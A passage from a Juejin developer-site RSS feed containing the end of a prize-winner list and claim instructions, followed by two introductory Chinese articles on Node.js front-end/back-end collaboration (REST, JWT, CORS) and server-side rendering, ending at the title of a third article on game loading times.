title="https://juejin.cn/user/571401777200855">青莲使者</a></td><td>执剑人</td><td><a href="https://juejin.cn/user/3139860942296830" target="_blank" title="https://juejin.cn/user/3139860942296830">悟空码字</a></td><td>持灯者</td></tr><tr><td><a href="https://juejin.cn/user/2708795806468382" target="_blank" title="https://juejin.cn/user/2708795806468382">MX巴赫</a></td><td>创世神</td><td><a href="https://juejin.cn/user/2859195116030318" target="_blank" title="https://juejin.cn/user/2859195116030318">舞影随风</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/2682464102784328" target="_blank" title="https://juejin.cn/user/2682464102784328">春去秋又来</a></td><td>创世神</td><td><a href="https://juejin.cn/user/3298993565342151" target="_blank" title="https://juejin.cn/user/3298993565342151">刘羡阳</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/3767346701805048" target="_blank" title="https://juejin.cn/user/3767346701805048">不关橙猫猫的事</a></td><td>执剑人</td><td><a href="https://juejin.cn/user/440258982587470" target="_blank" title="https://juejin.cn/user/440258982587470">花脸丶</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/1310273588955581" target="_blank" title="https://juejin.cn/user/1310273588955581">此帐号已注销</a></td><td>起源者</td><td><a href="https://juejin.cn/user/3544481219755319" target="_blank" title="https://juejin.cn/user/3544481219755319">迷茫路人</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/1591748568294120" target="_blank" title="https://juejin.cn/user/1591748568294120">Gyrate</a></td><td>执剑人</td><td><a href="https://juejin.cn/user/430664286745271" target="_blank" title="https://juejin.cn/user/430664286745271">追梦_life</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/993614244352440" target="_blank" title="https://juejin.cn/user/993614244352440">旧梦已逝</a></td><td>创世神</td><td><a href="https://juejin.cn/user/2981531267892856" target="_blank" title="https://juejin.cn/user/2981531267892856">pdudo</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/2559318799424056" target="_blank" title="https://juejin.cn/user/2559318799424056">开坦克的贝塔er</a></td><td>探索家</td><td><a href="https://juejin.cn/user/431468564722270" target="_blank" title="https://juejin.cn/user/431468564722270">旺财是只喵</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/1838858941246718" target="_blank" title="https://juejin.cn/user/1838858941246718">codezen</a></td><td>创世神</td><td><a href="https://juejin.cn/user/919655283950878" target="_blank" title="https://juejin.cn/user/919655283950878">飞飞公猪</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/2260251640078536" target="_blank" title="https://juejin.cn/user/2260251640078536">Daxian1996</a></td><td>未明确</td><td><a href="https://juejin.cn/user/307518986787197" target="_blank" title="https://juejin.cn/user/307518986787197">NidhoggDJoking</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/3555135629558891" target="_blank" title="https://juejin.cn/user/3555135629558891">用户85241800072</a></td><td>起源者</td><td><a href="https://juejin.cn/user/4072246797665022" target="_blank" title="https://juejin.cn/user/4072246797665022">LuxiferMorningStart</a></td><td>执剑人</td></tr></tbody></table>
<h2 data-id="heading-1">领奖方式</h2>
<p>🌟上榜的掘友注意 <strong>[系统消息]</strong> （预计2026 年 1 月 6 日 18:00前下发），请于 <strong>2026 年 1 月 12 日 12:00</strong> 前在相关问卷中填写信息，逾期未提交将视为自动放弃奖品，千万不要错过呀～</p>
<p>🎁奖品将于问卷截止日期后的 10 个工作日内安排寄送，后续物流信息会通过私信同步。</p>
<p><strong>若对获奖名单有疑问，请先自查沸点，是否符合活动规则，可</strong> <strong><a href="https://juejin.cn/user/1927863324646522" target="_blank" title="https://juejin.cn/user/1927863324646522">点击链接</a></strong> <strong>联系「小羽轴working」进行申诉~</strong></p>
<p>申诉处理时间2026年1月7日-2026年1月14日，逾期将维持原结果。</p>
<p>再次恭喜所有获奖的掘友🎆你们的分享让好多人都瞧见了与 TRAE 协作 Coding 的无限乐趣和满满成就感～</p>
<p>感谢每一位参与者的超热情投入！</p>
<p>每一次代码优化、每一个需求被攻克，可都是超值得铭记的成长小印记！</p>
<p>未来掘金社区还会带来更多精彩活动和专属福利，记得持续关注官方动态，更多惊喜等你来解锁🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：Node.js + React Vue Angular 前后端协作实践]]></title>    <link>https://juejin.cn/post/7592062873828933682</link>    <guid>https://juejin.cn/post/7592062873828933682</guid>    <pubDate>2026-01-06T08:42:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592062873828933682" data-draft-id="7591969856577912882" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 编程实战：Node.js + React Vue  Angular 前后端协作实践"/> <meta itemprop="keywords" content="后端,前端,Node.js"/> <meta itemprop="datePublished" content="2026-01-06T08:42:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 编程实战：Node.js + React Vue  Angular 前后端协作实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:42:23.000Z" title="Tue Jan 06 2026 08:42:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>随着前后端分离成为主流架构，Node.js 已经成为连接前端框架与后端服务的重要桥梁。无论是 React、Vue 还是 Angular，几乎所有现代前端项目都可以通过 Node.js 构建高效、可扩展的后端系统。</p>
</blockquote>
<p>本文将从整体架构、接口设计、开发流程等方面，介绍 Node.js 与主流前端框架的实际协作方式。</p>
<hr/>
<h2 data-id="heading-0">一、为什么选择 Node.js 作为前端的后端</h2>
<p>Node.js 使用 JavaScript 作为开发语言，与前端技术栈天然统一。</p>
<p>前后端都使用同一语言，可以减少沟通成本，也方便代码复用，例如数据模型、校验规则等。</p>
<p>此外，Node.js 在 I/O 密集型场景下性能表现优秀，非常适合 API 服务。</p>
<hr/>
<h2 data-id="heading-1">二、典型的前后端分离架构</h2>
<p>在实际项目中，常见的架构模式如下：</p>
<ul>
<li>前端：React / Vue / Angular</li>
<li>后端：Node.js + Express / Koa / NestJS</li>
<li>数据层：MySQL / PostgreSQL / MongoDB</li>
<li>通信方式：HTTP / WebSocket</li>
</ul>
<p>前端只负责页面渲染和交互，后端专注于业务逻辑和数据处理。</p>
<hr/>
<h2 data-id="heading-2">三、Node.js 与前端的通信方式</h2>
<p>前端框架通常通过 HTTP 请求与 Node.js 交互。</p>
<p>常见接口形式包括：</p>
<ul>
<li>RESTful API</li>
<li>GraphQL</li>
<li>WebSocket 实时通信</li>
</ul>
<p>Node.js 负责接收请求、处理业务并返回 JSON 数据。</p>
<hr/>
<h2 data-id="heading-3">四、Node.js + React 的协作方式</h2>
<p>React 更关注组件化和状态管理，Node.js 提供纯数据接口。</p>
<p>常见实践包括：</p>
<ul>
<li>使用 Express 提供 REST API</li>
<li>使用 JWT 进行身份认证</li>
<li>React 通过 fetch 或 axios 调用接口</li>
</ul>
<p>这种方式解耦性高，适合大型项目。</p>
<hr/>
<h2 data-id="heading-4">五、Node.js + Vue 的协作方式</h2>
<p>Vue 在中小型项目中应用非常广泛。</p>
<p>常见组合方式为：</p>
<ul>
<li>Vue 负责前端页面</li>
<li>Node.js 作为 API 服务</li>
<li>使用 Vite 或 Vue CLI 构建前端</li>
</ul>
<p>Node.js 不关心页面渲染，只提供数据接口。</p>
<hr/>
<h2 data-id="heading-5">六、Node.js + Angular 的协作方式</h2>
<p>Angular 本身集成度较高，更偏向企业级应用。</p>
<p>Node.js 通常作为独立后端服务，提供：</p>
<ul>
<li>标准化 API</li>
<li>统一权限验证</li>
<li>数据聚合接口</li>
</ul>
<p>Angular 使用 HttpClient 与 Node.js 通信。</p>
<hr/>
<h2 data-id="heading-6">七、接口设计的最佳实践</h2>
<p>为了让前端更易使用，Node.js 接口应保持统一风格。</p>
<p>常见建议包括：</p>
<ul>
<li>使用统一返回格式</li>
<li>明确 HTTP 状态码</li>
<li>接口命名清晰</li>
</ul>
<p>良好的接口设计能显著降低前端开发成本。</p>
<hr/>
<h2 data-id="heading-7">八、身份认证与权限管理</h2>
<p>在前后端分离架构中，通常使用 JWT。</p>
<p>流程为：</p>
<ul>
<li>Node.js 登录接口返回 Token</li>
<li>前端保存 Token</li>
<li>请求时携带 Token</li>
</ul>
<p>这样可以支持多端登录和无状态部署。</p>
<hr/>
<h2 data-id="heading-8">九、跨域问题的处理</h2>
<p>当前后端分开部署时，跨域是常见问题。</p>
<p>Node.js 可以通过中间件统一处理跨域请求。</p>
<pre><code class="hljs language-js" lang="js">app.<span class="hljs-title function_">use</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">'cors'</span>)());
</code></pre>
<p>合理配置跨域规则，可以保证安全性。</p>
<hr/>
<h2 data-id="heading-9">十、开发与部署流程</h2>
<p>一个常见的开发流程如下：</p>
<ul>
<li>前端与后端分别开发</li>
<li>约定接口文档</li>
<li>本地联调</li>
<li>独立部署</li>
</ul>
<p>生产环境中，前端和 Node.js 后端可以部署在不同服务器。</p>
<hr/>
<h2 data-id="heading-10">十一、Node.js 是否可以做服务端渲染</h2>
<p>Node.js 也可以参与服务端渲染。</p>
<p>例如：</p>
<ul>
<li>React 的 SSR</li>
<li>Vue 的 SSR</li>
<li>Angular Universal</li>
</ul>
<p>这种方式可以提升首屏加载速度和 SEO 效果。</p>
<hr/>
<h2 data-id="heading-11">十二、总结</h2>
<p>Node.js 与 React、Vue、Angular 的结合，已经成为现代 Web 开发的主流方案。通过清晰的接口设计、统一的认证机制和合理的架构拆分，可以构建高效、可维护的前后端系统。</p>
<p>在《Node.js 编程实战》中，理解这种协作模式，是迈向全栈开发的重要一步。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：前后端结合的 SSR 服务端渲染]]></title>    <link>https://juejin.cn/post/7592062873828966450</link>    <guid>https://juejin.cn/post/7592062873828966450</guid>    <pubDate>2026-01-06T08:42:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592062873828966450" data-draft-id="7592062873828950066" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 编程实战：前后端结合的 SSR 服务端渲染"/> <meta itemprop="keywords" content="后端,前端,Node.js"/> <meta itemprop="datePublished" content="2026-01-06T08:42:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 编程实战：前后端结合的 SSR 服务端渲染
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:42:50.000Z" title="Tue Jan 06 2026 08:42:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在前后端分离架构流行的同时，服务端渲染（SSR）再次受到关注。SSR 可以在服务端生成完整 HTML 页面，再返回给浏览器，从而提升首屏加载速度和搜索引擎友好度。</p>
</blockquote>
<p>Node.js 作为 JavaScript 运行时，非常适合承担 SSR 渲染层的角色。本文将介绍 SSR 的核心概念、应用场景以及在 Node.js 中的实践方式。</p>
<hr/>
<h2 data-id="heading-0">一、什么是 SSR 服务端渲染</h2>
<p>SSR 是指页面内容在服务端完成渲染。</p>
<p>服务端接收到请求后，生成完整的 HTML 页面，并将其返回给客户端，浏览器只负责展示内容和执行必要的交互脚本。</p>
<p>与之对应的是 CSR（客户端渲染），页面内容主要由浏览器通过 JavaScript 动态生成。</p>
<hr/>
<h2 data-id="heading-1">二、为什么需要 SSR</h2>
<p>在某些场景下，纯客户端渲染存在明显不足。</p>
<p>例如：</p>
<ul>
<li>首屏加载速度慢</li>
<li>SEO 不友好</li>
<li>弱网环境体验差</li>
</ul>
<p>SSR 能够在页面加载时直接返回完整内容，从而改善这些问题。</p>
<hr/>
<h2 data-id="heading-2">三、Node.js 在 SSR 中的角色</h2>
<p>Node.js 通常作为 SSR 的运行环境。</p>
<p>它负责：</p>
<ul>
<li>接收 HTTP 请求</li>
<li>获取业务数据</li>
<li>执行前端渲染逻辑</li>
<li>返回 HTML</li>
</ul>
<p>由于 Node.js 与前端框架使用同一种语言，代码复用成本较低。</p>
<hr/>
<h2 data-id="heading-3">四、SSR 的基本渲染流程</h2>
<p>一个典型的 SSR 流程如下：</p>
<ol>
<li>浏览器发起请求</li>
<li>Node.js 服务接收请求</li>
<li>获取页面所需数据</li>
<li>生成 HTML 字符串</li>
<li>返回给浏览器</li>
</ol>
<p>浏览器在加载完成后，再接管页面交互逻辑。</p>
<hr/>
<h2 data-id="heading-4">五、Node.js + React 的 SSR 思路</h2>
<p>在 React 中，SSR 通常通过服务端渲染组件完成。</p>
<p>Node.js 调用渲染方法，将组件转换为 HTML 字符串，并注入到模板中。</p>
<p>这种方式可以在不牺牲交互能力的前提下，提高首屏性能。</p>
<hr/>
<h2 data-id="heading-5">六、Node.js + Vue 的 SSR 思路</h2>
<p>Vue 提供了完整的 SSR 解决方案。</p>
<p>Node.js 负责创建渲染上下文，Vue 在服务端生成页面结构，客户端再进行激活。</p>
<p>这种模式在中大型项目中应用广泛。</p>
<hr/>
<h2 data-id="heading-6">七、Node.js + Angular 的 SSR 思路</h2>
<p>Angular 通过 Universal 实现服务端渲染。</p>
<p>Node.js 通常作为中间层，负责启动渲染服务并处理请求。</p>
<p>该方案更适合对 SEO 和性能要求较高的企业级应用。</p>
<hr/>
<h2 data-id="heading-7">八、SSR 与 CSR 的混合模式</h2>
<p>在实际项目中，SSR 通常不会完全替代 CSR。</p>
<p>常见做法是：</p>
<ul>
<li>首屏使用 SSR</li>
<li>后续交互由客户端接管</li>
</ul>
<p>这种方式在性能和开发效率之间取得平衡。</p>
<hr/>
<h2 data-id="heading-8">九、SSR 带来的挑战</h2>
<p>SSR 也会引入一些额外复杂度。</p>
<p>例如：</p>
<ul>
<li>服务端压力增加</li>
<li>构建流程更复杂</li>
<li>状态同步问题</li>
</ul>
<p>因此，并不是所有项目都适合 SSR。</p>
<hr/>
<h2 data-id="heading-9">十、何时应该选择 SSR</h2>
<p>以下场景更适合使用 SSR：</p>
<ul>
<li>内容型网站</li>
<li>对 SEO 要求高的项目</li>
<li>首屏体验要求高</li>
</ul>
<p>而后台系统或内部工具，通常不需要 SSR。</p>
<hr/>
<h2 data-id="heading-10">十一、部署与运维注意事项</h2>
<p>SSR 服务本质上是 Node.js 服务。</p>
<p>部署时需要关注：</p>
<ul>
<li>服务器资源配置</li>
<li>并发处理能力</li>
<li>缓存策略</li>
</ul>
<p>合理使用缓存可以显著降低渲染压力。</p>
<hr/>
<h2 data-id="heading-11">十二、总结</h2>
<p>SSR 是前后端结合的一种重要实践方式。借助 Node.js，可以高效地将前端框架运行在服务端，从而获得更好的性能和搜索引擎表现。</p>
<p>在《Node.js 编程实战》中，理解 SSR 的原理和适用场景，有助于在复杂项目中做出正确的技术选型。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么游戏需要"加载时间"？——从硬盘读取到内存渲染]]></title>    <link>https://juejin.cn/post/7591942733366001698</link>    <guid>https://juejin.cn/post/7591942733366001698</guid>    <pubDate>2026-01-06T08:45:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591942733366001698" data-draft-id="7591882877312122932" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么游戏需要&quot;加载时间&quot;？——从硬盘读取到内存渲染"/> <meta itemprop="keywords" content="后端,程序员"/> <meta itemprop="datePublished" content="2026-01-06T08:45:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="无限大6"/> <meta itemprop="url" content="https://juejin.cn/user/2865758605422890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么游戏需要"加载时间"？——从硬盘读取到内存渲染
